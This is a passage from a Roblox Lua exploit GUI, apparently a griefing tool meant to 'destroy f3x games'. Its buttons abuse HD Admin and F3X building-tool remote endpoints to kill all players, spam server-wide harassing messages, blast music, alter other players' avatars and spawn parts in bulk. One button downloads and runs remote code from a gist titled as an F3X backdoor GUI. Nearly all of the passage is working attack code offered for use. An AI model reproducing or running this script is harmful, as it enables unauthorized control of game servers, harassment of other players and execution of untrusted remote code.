TextButton_39.Size = UDim2.new(0, 104, 0, 33)
TextButton_39.Font = Enum.Font.Merriweather
TextButton_39.Text = "f3x decal spam"
TextButton_39.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_39.TextScaled = true
TextButton_39.TextSize = 14.000
TextButton_39.TextWrapped = true

TextButton_40.Parent = page_2
TextButton_40.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_40.BackgroundTransparency = 0.450
TextButton_40.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_40.BorderSizePixel = 3
TextButton_40.Position = UDim2.new(0.0222119037, 0, 0.356587976, 0)
TextButton_40.Size = UDim2.new(0, 104, 0, 33)
TextButton_40.Font = Enum.Font.Merriweather
TextButton_40.Text = "f3x become thomas"
TextButton_40.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_40.TextScaled = true
TextButton_40.TextSize = 14.000
TextButton_40.TextWrapped = true

TextButton_41.Parent = page_2
TextButton_41.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_41.BackgroundTransparency = 0.450
TextButton_41.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_41.BorderSizePixel = 3
TextButton_41.Position = UDim2.new(0.0222119037, 0, 0.212587968, 0)
TextButton_41.Size = UDim2.new(0, 104, 0, 33)
TextButton_41.Font = Enum.Font.Merriweather
TextButton_41.Text = "music9_skeletons"
TextButton_41.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_41.TextScaled = true
TextButton_41.TextSize = 14.000
TextButton_41.TextWrapped = true

-- Scripts:

local function YVZMWN_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(YVZMWN_fake_script)()
local function FDYJ_fake_script() -- _1.LocalScript 
	local script = Instance.new('LocalScript', _1)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.page_1.Visible = true
		script.Parent.Parent.Parent.page_2.Visible = false
	end)
end
coroutine.wrap(FDYJ_fake_script)()
local function PCBR_fake_script() -- _2.LocalScript 
	local script = Instance.new('LocalScript', _2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.page_1.Visible = false
		script.Parent.Parent.Parent.page_2.Visible = true
	end)
end
coroutine.wrap(PCBR_fake_script)()
local function UOKUN_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	--DO NOT CHANGE ANYTHING UNLESS YOU KNOW WHAT YOU ARE DOING
	
	
	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
	counter = 0
	
	while wait(0.1)do
		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)--Change "BackgroundColor3" to "TextColor3" if you want to have rainbow text
	
		counter = counter + 0.01
	end
end
coroutine.wrap(UOKUN_fake_script)()
local function VSDK_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";talk all IceCream Cat was here :D")
	end)
end
coroutine.wrap(VSDK_fake_script)()
local function MXJV_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";notice all IceCream Cat was here :D")
	end)
end
coroutine.wrap(MXJV_fake_script)()
local function VETBHBM_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam db IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam bk IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam white IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam pk IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam p IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam blue IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam red IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam yellow IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam o IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam dg IceCream Cat joined:D")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";createteam green IceCream Cat joined:D")
		
	end)
end
coroutine.wrap(VETBHBM_fake_script)()
local function CUPAXIS_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage IceCream Cat was here! :D")
	end)
	
end
coroutine.wrap(CUPAXIS_fake_script)()
local function GFEQK_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 18841891575")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
	
end
coroutine.wrap(GFEQK_fake_script)()
local function HWXC_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";time 0")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";disco")
	end)
	
end
coroutine.wrap(HWXC_fake_script)()
local function OKERIBN_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";name all IceCream Cat was here! :D")
	end)
	
end
coroutine.wrap(OKERIBN_fake_script)()
local function WLOFG_fake_script() -- TextButton_8.LocalScript 
	local script = Instance.new('LocalScript', TextButton_8)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";alert all IceCream Cat joined:D")
	end)
	
end
coroutine.wrap(WLOFG_fake_script)()
local function ILNJTEM_fake_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";spin all 10")
	end)
end
coroutine.wrap(ILNJTEM_fake_script)()
local function CECE_fake_script() -- TextButton_10.LocalScript 
	local script = Instance.new('LocalScript', TextButton_10)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";earthquake all inf")
	end)
end
coroutine.wrap(CECE_fake_script)()
local function EXMM_fake_script() -- TextButton_11.LocalScript 
	local script = Instance.new('LocalScript', TextButton_11)

	script.Parent.MouseButton1Click:Connect(function()
		if game.PlaceId == "7415160483" then
			game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";give me building tools")
		else
			game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";btools")
		end
	end)
	
end
coroutine.wrap(EXMM_fake_script)()
local function MVFHEX_fake_script() -- TextButton_12.LocalScript 
	local script = Instance.new('LocalScript', TextButton_12)

	script.Parent.MouseButton1Click:Connect(function()
		local args = {
			[1] = {
				["ShowResultsTo"] = "Everyone",
				["VoteTime"] = "20",
				["Question"] = "is IceCream Cat god?",
				["Answers"] = {
					[1] = "yes",
					[2] = "yes"
				},
				["PlayerArg"] = "all",
				["Server"] = "Current"
			}
		}
	
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RetrievePollData:InvokeServer(unpack(args))
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.ExecutePoll:InvokeServer()
	end)
end
coroutine.wrap(MVFHEX_fake_script)()
local function OXYY_fake_script() -- TextButton_13.LocalScript 
	local script = Instance.new('LocalScript', TextButton_13)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";serverHint IceCream Cat was here! :D")
	end)
	
end
coroutine.wrap(OXYY_fake_script)()
local function REINHUJ_fake_script() -- TextButton_14.LocalScript 
	local script = Instance.new('LocalScript', TextButton_14)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 3824308862")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(REINHUJ_fake_script)()
local function UVJV_fake_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";kill all")
	end)
end
coroutine.wrap(UVJV_fake_script)()
local function UJVJ_fake_script() -- TextButton_16.LocalScript 
	local script = Instance.new('LocalScript', TextButton_16)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";char all 948201768")
	end)
	
end
coroutine.wrap(UJVJ_fake_script)()
local function NNHQ_fake_script() -- TextButton_17.LocalScript 
	local script = Instance.new('LocalScript', TextButton_17)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";unmusic")
	end)
end
coroutine.wrap(NNHQ_fake_script)()
local function WVBBFH_fake_script() -- TextButton_18.LocalScript 
	local script = Instance.new('LocalScript', TextButton_18)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/MRSBLACK999/a1521a41ab1d1b67f5073aacce0bce32/raw/432ed275c41a160eca06ca1ad473a67a50168182/Fe%2520F3x%2520Backdoor%2520Gui'))()
	end)
end
coroutine.wrap(WVBBFH_fake_script)()
local function OCTCPK_fake_script() -- TextButton_19.LocalScript 
	local script = Instance.new('LocalScript', TextButton_19)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage JOIN TEAM IceCream Cat XD")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage IceCream Cat was here! :D")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage i came for your sinner souls")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage IceCream Cat is god")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage i rule this server ;)")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage wanna cry?")
		wait(1)
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";servermessage welcome to hell bozo! :D")
	end)
	
end
coroutine.wrap(OCTCPK_fake_script)()
local function FNRIL_fake_script() -- TextButton_20.LocalScript 
	local script = Instance.new('LocalScript', TextButton_20)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";warp all")
	end)
end
coroutine.wrap(FNRIL_fake_script)()
local function VQQH_fake_script() -- TextButton_21.LocalScript 
	local script = Instance.new('LocalScript', TextButton_21)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";smoke all")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";fire all")
	end)
end
coroutine.wrap(VQQH_fake_script)()
local function GVKTSY_fake_script() -- TextButton_22.LocalScript 
	local script = Instance.new('LocalScript', TextButton_22)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";shirt all 0 ;pants all 0")
	end)
end
coroutine.wrap(GVKTSY_fake_script)()
local function YHWRGZ_fake_script() -- TextButton_23.LocalScript 
	local script = Instance.new('LocalScript', TextButton_23)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";gear me 10468797")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";gear bhi_ud7dgduidgrudu 10468797")
	end)
end
coroutine.wrap(YHWRGZ_fake_script)()
local function EYJDA_fake_script() -- TextButton_24.LocalScript 
	local script = Instance.new('LocalScript', TextButton_24)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";gear all 16726030")
	end)
end
coroutine.wrap(EYJDA_fake_script)()
local function UWELBR_fake_script() -- TextButton_25.LocalScript 
	local script = Instance.new('LocalScript', TextButton_25)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";face all 130632299761414")
	end)
end
coroutine.wrap(UWELBR_fake_script)()
local function NHVCX_fake_script() -- TextButton_26.LocalScript 
	local script = Instance.new('LocalScript', TextButton_26)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";noclip all nan ;alert all you're blind now :D")
	end)
end
coroutine.wrap(NHVCX_fake_script)()
local function EQAQQ_fake_script() -- TextButton_27.LocalScript 
	local script = Instance.new('LocalScript', TextButton_27)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";shirt all 113040126968824")
	end)
end
coroutine.wrap(EQAQQ_fake_script)()
local function WFVVAFS_fake_script() -- TextButton_28.LocalScript 
	local script = Instance.new('LocalScript', TextButton_28)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 1839272148")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(WFVVAFS_fake_script)()
local function VNUJ_fake_script() -- TextButton_29.LocalScript 
	local script = Instance.new('LocalScript', TextButton_29)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 17647322226")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";pitch 0.5")
	end)
end
coroutine.wrap(VNUJ_fake_script)()
local function YGOJQZ_fake_script() -- TextButton_30.LocalScript 
	local script = Instance.new('LocalScript', TextButton_30)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";gear me 77443461")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";gear bhi_ud7dgduidgrudu 77443461")
	end)
end
coroutine.wrap(YGOJQZ_fake_script)()
local function RHLZPS_fake_script() -- TextButton_31.LocalScript 
	local script = Instance.new('LocalScript', TextButton_31)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 16662831442 ")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";pitch 0.9")
	end)
end
coroutine.wrap(RHLZPS_fake_script)()
local function TJEJIEG_fake_script() -- TextButton_32.LocalScript 
	local script = Instance.new('LocalScript', TextButton_32)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 16190784875")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(TJEJIEG_fake_script)()
local function TCIMR_fake_script() -- TextButton_33.LocalScript 
	local script = Instance.new('LocalScript', TextButton_33)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 82469833115392")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(TCIMR_fake_script)()
local function ACPPL_fake_script() -- TextButton_34.LocalScript 
	local script = Instance.new('LocalScript', TextButton_34)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 76578817848504")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(ACPPL_fake_script)()
local function OPCMCND_fake_script() -- TextButton_35.LocalScript 
	local script = Instance.new('LocalScript', TextButton_35)

	script.Parent.MouseButton1Click:Connect(function()
		-- DO NOT DELETE THIS LEAVE MY CREDIT
	
		-- Rain Toad Script By ItsKittyyyGD 
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "8006679977")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(50, 50, 50))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.3) -- Here they change the appearance time of the Toads or other meshes
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 400
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								SetName(v, "MiniToad") -- Here the name of the toad changes
								SetAnchor(false, v)
								AddMesh(v)
								Resize(v, Vector3.new(100, 100, 100), v.CFrame)
								MeshResize(v, Vector3.new(8, 8, 8))
								SetMesh(v, "5038530279") -- Here put it A custom mesh
								SetTexture(v, "5038530309") -- X2
								SetCollision(v, false)
								v.Orientation = Vector3.new(0, 0, 0)
	
								v.CFrame = v.CFrame + Vector3.new(0, 0, 0)
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		-- Delete this if you are going to Use it in another script
	
		-- Obviously it has those noises because there is an official script that has it and the msg was making me lazy 
	end)
end
coroutine.wrap(OPCMCND_fake_script)()
local function BPDDW_fake_script() -- TextButton_36.LocalScript 
	local script = Instance.new('LocalScript', TextButton_36)

	script.Parent.MouseButton1Click:Connect(function()
		--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 193 | Scripts: 31 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.f3xmain2
		G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
		G2L["1"]["IgnoreGuiInset"] = true;
		G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
		G2L["1"]["Name"] = [[f3xmain2]];
		G2L["1"]["ResetOnSpawn"] = false;
	
	
		-- StarterGui.f3xmain2.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["Active"] = true;
		G2L["2"]["BorderSizePixel"] = 0;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["Size"] = UDim2.new(0.34288, 0, 0.4602, 0);
		G2L["2"]["Position"] = UDim2.new(0.03416, 0, 0.35075, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.top
		G2L["3"] = Instance.new("Frame", G2L["2"]);
		G2L["3"]["BorderSizePixel"] = 0;
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["Size"] = UDim2.new(1.05216, 0, 0.12209, 0);
		G2L["3"]["Position"] = UDim2.new(-0.02687, 0, 0, 0);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["Name"] = [[top]];
	
	
		-- StarterGui.f3xmain2.Frame.top.UIStroke
		G2L["4"] = Instance.new("UIStroke", G2L["3"]);
		G2L["4"]["Thickness"] = 7;
		G2L["4"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.top.TextLabel
		G2L["5"] = Instance.new("TextLabel", G2L["3"]);
		G2L["5"]["TextWrapped"] = true;
		G2L["5"]["BorderSizePixel"] = 0;
		G2L["5"]["TextSize"] = 14;
		G2L["5"]["TextScaled"] = true;
		G2L["5"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5"]["Size"] = UDim2.new(0.48923, 0, -1, 0);
		G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["Text"] = [[script made by: bedman or NDLgen]];
		G2L["5"]["Position"] = UDim2.new(0, 0, 0.98307, 0);
	
	
		-- StarterGui.f3xmain2.Frame.top.TextLabel.UITextSizeConstraint
		G2L["6"] = Instance.new("UITextSizeConstraint", G2L["5"]);
		G2L["6"]["MaxTextSize"] = 21;
	
	
		-- StarterGui.f3xmain2.Frame.top.TextLabel
		G2L["7"] = Instance.new("TextLabel", G2L["3"]);
		G2L["7"]["TextWrapped"] = true;
		G2L["7"]["BorderSizePixel"] = 0;
		G2L["7"]["TextSize"] = 14;
		G2L["7"]["TextScaled"] = true;
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7"]["Size"] = UDim2.new(0.47774, 0, -1, 0);
		G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["Text"] = [[use this to destroy f3x games]];
		G2L["7"]["Position"] = UDim2.new(0.522, 0, 0.98307, 0);
	
	
		-- StarterGui.f3xmain2.Frame.top.TextLabel.UITextSizeConstraint
		G2L["8"] = Instance.new("UITextSizeConstraint", G2L["7"]);
		G2L["8"]["MaxTextSize"] = 21;
	
	
		-- StarterGui.f3xmain2.Frame.UIStroke
		G2L["9"] = Instance.new("UIStroke", G2L["2"]);
		G2L["9"]["Thickness"] = 4;
		G2L["9"]["Color"] = Color3.fromRGB(121, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.bottom
		G2L["a"] = Instance.new("Frame", G2L["2"]);
		G2L["a"]["BorderSizePixel"] = 0;
		G2L["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["a"]["Size"] = UDim2.new(1.03848, 0, 0.12209, 0);
		G2L["a"]["Position"] = UDim2.new(0.49869, 0, 1.04605, 0);
		G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a"]["Name"] = [[bottom]];
	
	
		-- StarterGui.f3xmain2.Frame.bottom.UIStroke
		G2L["b"] = Instance.new("UIStroke", G2L["a"]);
		G2L["b"]["Thickness"] = 7;
		G2L["b"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.bottom.TextButton
		G2L["c"] = Instance.new("TextButton", G2L["a"]);
		G2L["c"]["TextWrapped"] = true;
		G2L["c"]["BorderSizePixel"] = 0;
		G2L["c"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["c"]["TextSize"] = 14;
		G2L["c"]["TextScaled"] = true;
		G2L["c"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["c"]["Size"] = UDim2.new(-1, 0, -1, 0);
		G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["c"]["Text"] = [[Give f3x (only if your admin rank in hd admin games )]];
		G2L["c"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
	
	
		-- StarterGui.f3xmain2.Frame.bottom.TextButton.LocalScript
		G2L["d"] = Instance.new("LocalScript", G2L["c"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.bottom.TextButton.UITextSizeConstraint
		G2L["e"] = Instance.new("UITextSizeConstraint", G2L["c"]);
		G2L["e"]["MaxTextSize"] = 38;
	
	
		-- StarterGui.f3xmain2.Frame.DragScript
		G2L["f"] = Instance.new("LocalScript", G2L["2"]);
		G2L["f"]["Name"] = [[DragScript]];
	
	
		-- StarterGui.f3xmain2.Frame.main
		G2L["10"] = Instance.new("Frame", G2L["2"]);
		G2L["10"]["BorderSizePixel"] = 0;
		G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["10"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["10"]["Size"] = UDim2.new(0.96275, 0, 0.77035, 0);
		G2L["10"]["Position"] = UDim2.new(0.49862, 0, 0.55087, 0);
		G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["10"]["Name"] = [[main]];
		G2L["10"]["BackgroundTransparency"] = 0.3;
	
	
		-- StarterGui.f3xmain2.Frame.main.UIStroke
		G2L["11"] = Instance.new("UIStroke", G2L["10"]);
		G2L["11"]["Thickness"] = 2;
		G2L["11"]["Color"] = Color3.fromRGB(151, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction
		G2L["12"] = Instance.new("Frame", G2L["10"]);
		G2L["12"]["BorderSizePixel"] = 0;
		G2L["12"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["12"]["Size"] = UDim2.new(0.46206, 0, 0.89573, 0);
		G2L["12"]["Position"] = UDim2.new(0.02679, 0, 0.04151, 0);
		G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
